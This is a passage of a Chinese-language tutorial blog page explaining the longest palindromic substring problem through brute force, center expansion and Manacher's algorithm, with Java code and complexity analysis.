res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private boolean valid(String s, int left, int right) &#123;</span><br><span class="line">        &#x2F;&#x2F; 验证子串 s[left, right] 是否为回文串</span><br><span class="line">        while (left &lt; right) &#123;</span><br><span class="line">            if (s.charAt(left) !&#x3D; s.charAt(right)) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暴力解法时间复杂度高，但是思路清晰、编写简单，因为编写的正确性的可能性很大，可以使用暴力匹配算法检验我们编写的其它算法是否正确。<br><strong>复杂度分析</strong>：</p><ul><li>时间复杂度：O(N<em>N</em>N) ，这里N  是字符串的长度，枚举字符串的左边界、右边界，然后继续验证子串是否是回文子串，这三种操作都与 N 相关</li><li>空间复杂度：O(1) ，只使用到常数个临时变量，与字符串长度无关。</li></ul><h1 id="方法二：中心扩散法"><a href="#方法二：中心扩散法" class="headerlink" title="方法二：中心扩散法"></a>方法二：中心扩散法</h1><p>暴力法采用双指针两边夹，验证是否是回文子串，时间复杂度比较高，除了枚举字符串的左右边界以外，比较容易想到的是<strong>枚举可能出现的回文子串的“中心位置”，从“中心位置”尝试尽可能扩散出去，得到一个回文串</strong>。</p><p>因此，中心扩散法的思路是：遍历每一个索引，以这个索引为中心，利用“回文串”中心对称的特点，往两边扩散，看最多能扩散多远。</p><p>枚举“中心位置”时间复杂度为O(N) ，从“中心位置”扩散得到“回文子串”的时间复杂度为O(N) ，因此时间复杂度可以降到 O(N*N) 。</p><p>在这里要注意一个细节：回文串在长度为奇数和偶数的时候，“回文中心”的形式是不一样的。</p><ul><li>奇数回文串的“中心”是一个具体的字符，例如：回文串 <code>&quot;aba&quot;</code> 的中心是字符 <code>&quot;a&quot;</code>；</li><li>偶数回文串的“中心”是位于中间的两个字符的“空隙”，例如：回文串串 <code>&quot;abba&quot;</code> 的中心是两个 <code>&quot;b&quot;</code> 中间的那个“空隙”。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-0801d4502cf76c7b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>我们看一下一个字符串可能的回文子串的中心在哪里？<br><img src="https://upload-images.jianshu.io/upload_images/15531792-10a31bc6f4bd476d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>我们可以设计一个方法，兼容以上两种情况：</li></ul><ol><li>如果传入重合的索引编码，进行中心扩散，此时得到的回文子串的长度是奇数；</li><li>如果传入相邻的索引编码，进行中心扩散，此时得到的回文子串的长度是偶数。<br>具体编码细节在以下的代码的注释中体现。</li></ol><p><strong>参考代码2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;www.cxyxiaowu.com</span><br><span class="line">public class Solution &#123;</span><br><span class="line"></span><br><span class="line">    public String longestPalindrome(String s) &#123;</span><br><span class="line">        int len &#x3D; s.length();</span><br><span class="line">        if (len &lt; 2) &#123;</span><br><span class="line">            return s;</span><br><span class="line">        &#125;</span><br><span class="line">        int maxLen &#x3D; 1;</span><br><span class="line">        String res &#x3D; s.substring(0, 1);</span><br><span class="line">        &#x2F;&#x2F; 中心位置枚举到 len - 2 即可</span><br><span class="line">        for (int i &#x3D; 0; i &lt; len - 1; i++) &#123;</span><br><span class="line">            String oddStr &#x3D; centerSpread(s, i, i);</span><br><span class="line">            String evenStr &#x3D; centerSpread(s, i, i + 1);</span><br><span class="line">            String maxLenStr &#x3D; oddStr.length() &gt; evenStr.length() ? oddStr : evenStr;</span><br><span class="line">            if (maxLenStr.length() &gt; maxLen) &#123;</span><br><span class="line">                maxLen &#x3D; maxLenStr.length();</span><br><span class="line">                res &#x3D; maxLenStr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private String centerSpread(String s, int left, int right) &#123;</span><br><span class="line">        &#x2F;&#x2F; left &#x3D; right 的时候，此时回文中心是一个空隙，回文串的长度是奇数</span><br><span class="line">        &#x2F;&#x2F; right &#x3D; left + 1 的时候，此时回文中心是任意一个字符，回文串的长度是偶数</span><br><span class="line">        int len &#x3D; s.length();</span><br><span class="line">        int i &#x3D; left;</span><br><span class="line">        int j &#x3D; right;</span><br><span class="line">        while (i &gt;&#x3D; 0 &amp;&amp; j &lt; len) &#123;</span><br><span class="line">            if (s.charAt(i) &#x3D;&#x3D; s.charAt(j)) &#123;</span><br><span class="line">                i--;</span><br><span class="line">                j++;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 这里要小心，跳出 while 循环时，恰好满足 s.charAt(i) !&#x3D; s.charAt(j)，因此不能取 i，不能取 j</span><br><span class="line">        return s.substring(i + 1, j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>复杂度分析：</strong></p><ul><li>时间复杂度：O(N*N) ，理由已经叙述。</li><li>空间复杂度：O(1) ，只使用到常数个临时变量，与字符串长度无关。</li></ul><p>事实上，还有时间复杂度更优的算法，是由计算机科学家 Manacher 发明的，下面介绍这种算法。</p><h1 id="方法三：Manacher-算法"><a href="#方法三：Manacher-算法" class="headerlink" title="方法三：Manacher 算法"></a>方法三：Manacher 算法</h1><p>Manacher 算法，被中国程序员戏称为“马拉车”算法。它专门用于解决“最长回文子串”问题，时间复杂度为O(N) 。</p><p>维基百科中对于 Manacher 算法是这样描述的：<br>**[Manacher(1975)] 发现了一种线性时间算法，可以在列出给定字符串中从字符串头部开始的所有回文。并且，Apostolico, Breslauer &amp; Galil (1995) 发现，同样的算法也可以在任意位置查找全部最大回文子串，并且时间复杂度是线性的。因此，他们提供了一种时间复杂度为线性的最长回文子串解法。替代性的线性时间解决 Jeuring (1994), Gusfield (1997)提供的，基于后缀树(suffix trees)。也存在已知的高效并行算法。**</p><p>Manacher 算法本质上还是中心扩散法，只不过它使用了类似 KMP 算法的技巧，充分挖掘了已经进行回文判定的子串的特点，在遍历的过程中，记录了已经遍历过的子串的信息，也是典型的以空间换时间思想的体现。</p><p>下面介绍 Manacher 算法的具体流程。</p><h2 id="第-1-步：对原始字符串进行预处理（添加分隔符"><a href="#第-1-步：对原始字符串进行预处理（添加分隔符" class="headerlink" title="第 1 步：对原始字符串进行预处理（添加分隔符)"></a>第 1 步：对原始字符串进行预处理（添加分隔符)</h2><p>首先在字符串的首尾、相邻的字符中插入分隔符，例如 “babad” 添加分隔符 “#” 以后得到 “#b#a#b#a#d#”。</p><p>对这一点有如下说明：</p><p>1、分隔符是一个字符，种类也只有一个，并且这个字符一定不能是原始字符串中出现过的字符；</p><p>2、加入了分隔符以后，使得“间隙”有了具体的位置，方便后续的讨论，并且新字符串中的任意一个回文子串在原始字符串中的一定能找到唯一的一个回文子串与之对应，因此对新字符串的回文子串的研究就能得到原始字符串的回文子串；</p><p>3、新字符串的回文子串的长度一定是奇数；</p><p>4、新字符串的回文子串一定以分隔符作为两边的边界，因此分隔符起到“哨兵”的作用。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-8ee1499078fe2050.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="原始字符串与新字符串的对应关系"></p><h2 id="第-2-步：计算辅助数组-p"><a href="#第-2-步：计算辅助数组-p" class="headerlink" title="第 2 步：计算辅助数组 p"></a>第 2 步：计算辅助数组 p</h2><p>辅助数组 p 记录了新字符串中以每个字符为中心的回文子串的信息。</p><p>手动的计算方法仍然是“中心扩散法”，此时记录以当前字符为中心，向左右两边同时扩散，记录能够扩散的最大步数。</p><p>以字符串 “abbabb” 为例，说明如何手动计算得到辅助数组 p ，我们要填的就是下面这张表。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-9ef1619027d75ad3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>第 1 行数组 <code>char</code> ：原始字符串<strong>加上分隔符以后</strong>的每个字符。</p><p>第 2 行数组 <code>index</code> ：这个数组是新字符串的索引数组，它的值是从<strong>0</strong> 开始的索引编号。</p><ul><li>我们首先填 <code>p[0]</code>。</li></ul><p>以 <code>char[0] = &#39;#&#39;</code> 为中心，同时向左边向右扩散，走 <strong>1</strong> 步就碰到边界了，因此能扩散的步数为 <strong>0</strong> ，因此 <code>p[0] = 0</code>；<br><img src="https://upload-images.jianshu.io/upload_images/15531792-3fbea673e0e06e78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="P0"></p><ul><li><p>下面填写 <code>p[1]</code> 。<br>以 <code>char[1] = &#39;a&#39;</code> 为中心，同时向左边向右扩散，走<strong>1</strong> 步，左右都是 <code>&quot;#&quot;</code>，构成回文子串，于是再继续同时向左边向右边扩散，左边就碰到边界了，最多能扩散的步数”为<strong>1</strong>，因此 <code>p[1] = 1</code>；<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b23ff151efd6b458.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="P1"></p></li><li><p>下面填写 <code>p[2]</code> 。</p></li></ul><p>以 <code>char[2] = &#39;#&#39;</code> 为中心，同时向左边向右扩散，走<strong>1</strong>步，左边是 <code>&quot;a&quot;</code>，右边是 <code>&quot;b&quot;</code>，不匹配，最多能扩散的步数为 <strong>0</strong>，因此 <code>p[2] = 0</code>；<br><img src="https://upload-images.jianshu.io/upload_images/15531792-9e8b4d8441b2ae4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="P2"></p><ul><li>下面填写 <code>p[3]</code>。</li></ul><p>以 <code>char[3] = &#39;b&#39;</code> 为中心，同时向左边向右扩散，走<strong>1</strong> 步，左右两边都是 <code>“#”</code>，构成回文子串，继续同时向左边向右扩散，左边是 <code>&quot;a&quot;</code>，右边是 <code>&quot;b&quot;</code>，不匹配，最多能扩散的步数为<strong>1</strong> ，因此 <code>p[3] = 1</code>；<br><img src="https://upload-images.jianshu.io/upload_images/15531792-dd7655d32565a3a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="P3"></p><ul><li>下面填写 <code>p[4]</code>。</li></ul><p>以 <code>char[4] = &#39;#&#39;</code> 为中心，同时向左边向右扩散，最多可以走 <strong>4</strong> 步，左边到达左边界，因此 <code>p[4] = 4</code>。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-3990b56d84c9ba4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="p4"></p><ul><li>继续填完 p 数组剩下的部分。</li></ul><p>分析到这里，后面的数字不难填出，最后写成如下表格：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-aa75fe2d9406f2e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="完整表格"></p><p><strong>说明</strong>：有些资料将辅助数组 <code>p</code> 定义为回文半径数组，即 <code>p[i]</code> 记录了以新字符串第 <code>i</code> 个字符为中心的回文字符串的半径（包括第 <code>i</code> 个字符），与我们这里定义的辅助数组 <code>p</code> 有一个字符的偏差，本质上是一样的。</p><p>下面是辅助数组 <code>p</code> 的结论：辅助数组 <code>p</code> 的最大值是<strong>5</strong> ，对应了原字符串 <code>&quot;abbabb&quot;</code> 的 “最长回文子串” ：<code>&quot;bbabb&quot;</code>。这个结论具有一般性，即：<br><code>辅助数组 p 的最大值就是“最长回文子串”的长度。</code><br>因此，我们可以在计算辅助数组 p 的过程中记录这个最大值，并且记录最长回文子串。</p><p>简单说明一下这是为什么：</p><p>如果新回文子串的中心是一个字符，那么原始回文子串的中心也是一个字符，在新回文子串中，向两边扩散的特点是：“先分隔符，后字符”，同样扩散的步数因为有分隔符 # 的作用，在新字符串中每扩散两步，虽然实际上只扫到一个有效字符，但是相当于在原始字符串中相当于计算了两个字符。因为最后一定以分隔符结尾，还要计算一个，正好这个就可以把原始回文子串的中心算进去；</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-0fefc1245b8edf6f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="理解辅助数组的数值与原始字符串回文子串的等价性-1"></p><ol><li>如果新回文子串的中心是 <code>#</code>，那么原始回文子串的中心就是一个“空隙”。在新回文子串中，向两边扩散的特点是：“先字符，后分隔符”，扩散的步数因为有分隔符 <code>#</code> 的作用，在新字符串中每扩散两步，虽然实际上只扫到一个有效字符，但是相当于在原始字符串中相当于计算了两个字符。</li></ol><p>因此，“辅助数组 <code>p</code> 的最大值就是“最长回文子串”的长度”这个结论是成立的，可以看下面的图理解上面说的 <strong>2</strong>  点。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-dadfbaca596314de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="理解辅助数组的数值与原始字符串回文子串的等价性-2"></p><p>写到这里，其实已经能写出一版代码，把这一版代码提交到 LeetCode 是可以通过的，这同样也可以验证我们上面的结论是正确的。</p><p><strong>参考代码3</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;www.cxyxiaowu.com</span><br><span class="line">public class Solution &#123;</span><br><span class="line"></span><br><span class="line">    public String longestPalindrome(String s) &#123;</span><br><span class="line">        int len &#x3D; s.length();</span><br><span class="line">        if (len &lt; 2) &#123;</span><br><span class="line">            return s;</span><br><span class="line">        &#125;</span><br><span class="line">        String str &#x3D; addBoundaries(s, &#39;#&#39;);</span><br><span class="line">        int sLen &#x3D; 2 * len + 1;</span><br><span class="line">        int maxLen &#x3D; 1;</span><br><span class="line"></span><br><span class="line">        int start &#x3D; 0;</span><br><span class="line">        for (int i &#x3D; 0; i &lt; sLen; i++) &#123;</span><br><span class="line">            int curLen &#x3D; centerSpread(str, i);</span><br><span class="line">            if (curLen &gt; maxLen) &#123;</span><br><span class="line">                maxLen &#x3D; curLen;</span><br><span class="line">                start &#x3D; (i - maxLen) &#x2F; 2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return s.substring(start, start + maxLen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int centerSpread(String s, int center) &#123;</span><br><span class="line">        &#x2F;&#x2F; left &#x3D; right 的时候，此时回文中心是一个空隙，回文串的长度是奇数</span><br><span class="line">        &#x2F;&#x2F; right &#x3D; left + 1 的时候，此时回文中心是任意一个字符，回文串的长度是偶数</span><br><span class="line">        int len &#x3D; s.length();</span><br><span class="line">        int i &#x3D; center - 1;</span><br><span class="line">        int j &#x3D; center + 1;</span><br><span class="line">        int step &#x3D; 0;</span><br><span class="line">        while (i &gt;&#x3D; 0 &amp;&amp; j &lt; len &amp;&amp; s.charAt(i) &#x3D;&#x3D; s.charAt(j)) &#123;</span><br><span class="line">            i--;</span><br><span class="line">            j++;</span><br><span class="line">            step++;</span><br><span class="line">        &#125;</span><br><span class="line">        return step;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 创建预处理字符串</span><br><span class="line">     *</span><br><span class="line">     * @param s      原始字符串</span><br><span class="line">     * @param divide 分隔字符</span><br><span class="line">     * @return 使用分隔字符处理以后得到的字符串</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private String addBoundaries(String s, char divide) &#123;</span><br><span class="line">        int len &#x3D; s.length();</span><br><span class="line">        if (len &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (s.indexOf(divide) !&#x3D; -1) &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;参数错误，您传递的分割字符，在输入字符串中存在！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder stringBuilder &#x3D; new StringBuilder();</span><br><span class="line">        for (int i &#x3D; 0; i &lt; len; i++) &#123;</span><br><span class="line">            stringBuilder.append(divide);</span><br><span class="line">            stringBuilder.append(s.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        stringBuilder.append(divide);</span><br><span class="line">        return stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>复杂度分析</strong>：</p><ul><li>时间复杂度: O(N<em>N)，这里 N 是原始字符串的长度。新字符串的长度是(2</em>N+1)，不计系数与常数项，因此时间复杂度仍为O(N*N)</li><li>空间复杂度：O(N) 。</li></ul><h2 id="科学家的工作：充分利用新字符串的回文性质，计算辅助数组-p"><a href="#科学家的工作：充分利用新字符串的回文性质，计算辅助数组-p" class="headerlink" title="科学家的工作：充分利用新字符串的回文性质，计算辅助数组 p"></a>科学家的工作：充分利用新字符串的回文性质，计算辅助数组 p</h2><p>上面的代码不太智能的地方是，对新字符串每一个位置进行中心扩散，会导致原始字符串的每一个字符被访问多次，一个比较极端的情况就是：<code>#a#a#a#a#a#a#a#a#</code>。事实上，计算机科学家 Manacher 就改进了这种算法，使得在填写新的辅助数组 <code>p</code> 的值的时候，能够参考已经填写过的辅助数组 <code>p</code> 的值，使得新字符串每个字符只访问了一次，整体时间复杂度由O(N*N)  改进到 O(N)。</p><p>具体做法是：在遍历的过程中，除了循环变量 <code>i</code> 以外，我们还需要记录两个变量，它们是 <code>maxRight</code> 和 <code>center</code> ，它们分别的含义如下：</p><ul><li><code>maxRight</code>：记录当前向右扩展的最远边界，即从开始到现在使用“中心扩散法”能得到的回文子串，它能延伸到的最右端的位置 。对于 <code>maxRight</code> 我们说明 3 点：</li></ul><ol><li>“向右最远”是在计算辅助数组 <code>p</code> 的过程中，向右边扩散能走的索引最大的位置，注意：得到一个 <code>maxRight</code> 所对应的回文子串，并不一定是当前得到的“最长回文子串”，很可能的一种情况是，某个回文子串可能比较短，但是它正好在整个字符串比较靠后的位置；</li><li><code>maxRight</code> 的下一个位置可能是被程序看到的，停止的原因有 2 点：（1）左边界不能扩散，导致右边界受限制也不能扩散，<code>maxRight</code> 的下一个位置看不到；（2）正是因为看到了 <code>maxRight</code> 的下一个位置，导致 <code>maxRight</code> 不能继续扩散。</li><li>为什么 <code>maxRight</code> 很重要？因为扫描是从左向右进行的， <code>maxRight</code> 能够提供的信息最多，它是一个重要的分类讨论的标准，因此我们需要一个变量记录它。</li></ol><ul><li><code>center</code>：<code>center</code> 是与 <code>maxRight</code> 相关的一个变量，它是上述 <code>maxRight</code> 的回文中心的索引值。对于 <code>center</code> 的说明如下：</li></ul><ol><li><code>center</code> 的形式化定义：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-f69b5f778ae6746d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="center 定义"></li></ol><p>说明：x + p[x] 的最大值就是我们定义的 maxRight，i 是循环变量，0&lt;= x&lt; i 表示是在 i 之前的所有索引里得到的最大值 maxRight，它对应的回文中心索引就是上述式子。</p><p>maxRight 与 center 是一一对应的关系，即一个 center 的值唯一对应了一个 maxRight 的值；因此 maxRight 与 center 必须要同时更新。<br>下面的讨论就根据循环变量 i 与 maxRight 的关系展开讨论：</p><p>情况 1：当 i &gt;= maxRight 的时候，这就是一开始，以及刚刚把一个回文子串扫描完的情况，此时只能够根据“中心扩散法”一个一个扫描，逐渐扩大 maxRight；</p><p>情况 2：当 i &lt; maxRight 的时候，根据新字符的回文子串的性质，循环变量关于 center 对称的那个索引（记为 mirror）的 p 值就很重要。</p><p>我们先看 mirror 的值是多少，因为 center 是中心，i 和 mirror 关于 center 中心对称，因此 (mirror + i) / 2 = center ，所以 mirror = 2 * center - i。</p><p>根据 p[mirror] 的数值从小到大，具体可以分为如下 3 种情况：</p><p>情况 2（1）：p[mirror] 的数值比较小，不超过 maxRight - i。</p><p>说明：maxRight - i 的值，就是从 i 关于 center 的镜像点开始向左走（不包括它自己），到 maxRight 关于 center 的镜像点的步数</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-4c9bd7d1a1a5e196.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Manacher 算法分类讨论情况 2（1）"></p><p>从图上可以看出，由于“以 center 为中心的回文子串”的对称性，导致了“以 i 为中心的回文子串”与“以 center 为中心的回文子串”也具有对称性，“以 i 为中心的回文子串”与“以 center 为中心的回文子串”不能再扩散了，此时，直接把数值抄过来即可，即 p[i] = p[mirror]。</p><p>情况 2（2）：p[mirror] 的数值恰好等于 maxRight - i。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-881768cc45948088.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Manacher 算法分类讨论情况 2（2）"></p><p>说明：仍然是依据“以 center 为中心的回文子串”的对称性，导致了“以 i 为中心的回文子串”与“以 center 为中心的回文子串”也具有对称性。</p><p>因为靠左边的 f 与靠右边的 g 的原因，导致“以 center 为中心的回文子串”不能继续扩散；<br>但是“以 i 为中心的回文子串” 还可以继续扩散。<br>因此，可以先把 p[mirror] 的值抄过来，然后继续“中心扩散法”，继续增加 maxRight。</p><p>情况 2（3）：p[mirror] 的数值大于 maxRight - i。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-03e4f6e57709a3a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Manacher 算法分类讨论情况 2（3）"><br>说明：仍然是依据“以 center 为中心的回文子串”的对称性，导致了“以 i 为中心的回文子串”与“以 center 为中心的回文子串”也具有对称性。<br>下面证明，p[i] = maxRight - i ，证明的方法还是利用三个回文子串的对称性。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-a96d524e914bc1c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Manacher 算法分类讨论情况 2（3）的证明"><br>① 由于“以 <code>center</code> 为中心的回文子串”的对称性， 黄色箭头对应的字符 <code>c</code> 和 <code>e</code> 一定不相等；</p><p>② 由于“以 <code>mirror</code> 为中心的回文子串”的对称性， 绿色箭头对应的字符 <code>c</code> 和 <code>c</code> 一定相等；</p><p>③ 又由于“以 <code>center</code> 为中心的回文子串”的对称性， 蓝色箭头对应的字符 <code>c</code> 和 <code>c</code> 一定相等；</p><p>推出“以 <code>i</code> 为中心的回文子串”的对称性， 红色箭头对应的字符 <code>c</code> 和 <code>e</code> 一定不相等。</p><p>因此，<code>p[i] = maxRight - i</code>，不可能再大。上面是因为我画的图，可能看的朋友会觉得理所当然。事实上，可以使用反证法证明：</p><p>如果“以 <code>i</code> 为中心的回文子串” 再向两边扩散的两个字符 <code>c</code> 和 <code>e</code> 相等，就能够推出黄色、绿色、蓝色、红色箭头所指向的 8 个变量的值都相等，此时“以 <code>center</code> 为中心的回文子串” 就可以再同时向左边和右边扩散 <strong>1</strong>  格，与 <code>maxRight</code> 的最大性矛盾。</p><p>综合以上 3 种情况，当 <code>i &lt; maxRight</code> 的时候，<code>p[i]</code> 可以参考 <code>p[mirror]</code> 的信息，以 <code>maxRight - i</code> 作为参考标准，<code>p[i]</code> 的值应该是保守的，即二者之中较小的那个值：</p><p><code>p[i] = min(maxRight - i, p[mirror]);</code></p><p><strong>参考代码4</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">public class Solution &#123;</span><br><span class="line"></span><br><span class="line">    public String longestPalindrome(String s) &#123;</span><br><span class="line">        &#x2F;&#x2F; 特判</span><br><span class="line">        int len &#x3D; s.length();</span><br><span class="line">        if (len &lt; 2) &#123;</span><br><span class="line">            return s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 得到预处理字符串</span><br><span class="line">        String str &#x3D; addBoundaries(s, &#39;#&#39;);</span><br><span class="line">        &#x2F;&#x2F; 新字符串的长度</span><br><span class="line">        int sLen &#x3D; 2 * len + 1;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 数组 p 记录了扫描过的回文子串的信息</span><br><span class="line">        int[] p &#x3D; new int[sLen];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 双指针，它们是一一对应的，须同时更新</span><br><span class="line">        int maxRight &#x3D; 0;</span><br><span class="line">        int center &#x3D; 0;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 当前遍历的中心最大扩散步数，其值等于原始字符串的最长回文子串的长度</span><br><span class="line">        int maxLen &#x3D; 1;</span><br><span class="line">        &#x2F;&#x2F; 原始字符串的最长回文子串的起始位置，与 maxLen 必须同时更新        </span><br><span class="line">        int start &#x3D; 0;</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; 0; i &lt; sLen; i++) &#123;</span><br><span class="line">            if (i &lt; maxRight) &#123;</span><br><span class="line">                int mirror &#x3D; 2 * center - i;</span><br><span class="line">                &#x2F;&#x2F; 这一行代码是 Manacher 算法的关键所在，要结合图形来理解</span><br><span class="line">                p[i] &#x3D; Math.min(maxRight - i, p[mirror]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 下一次尝试扩散的左右起点，能扩散的步数直接加到 p[i] 中</span><br><span class="line">            int left &#x3D; i - (1 + p[i]);</span><br><span class="line">            int right &#x3D; i + (1 + p[i]);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; left &gt;&#x3D; 0 &amp;&amp; right &lt; sLen 保证不越界</span><br><span class="line">            &#x2F;&#x2F; str.charAt(left) &#x3D;&#x3D; str.charAt(right) 表示可以扩散 1 次</span><br><span class="line">            while (left &gt;&#x3D; 0 &amp;&amp; right &lt; sLen &amp;&amp; str.charAt(left) &#x3D;&#x3D; str.charAt(right)) 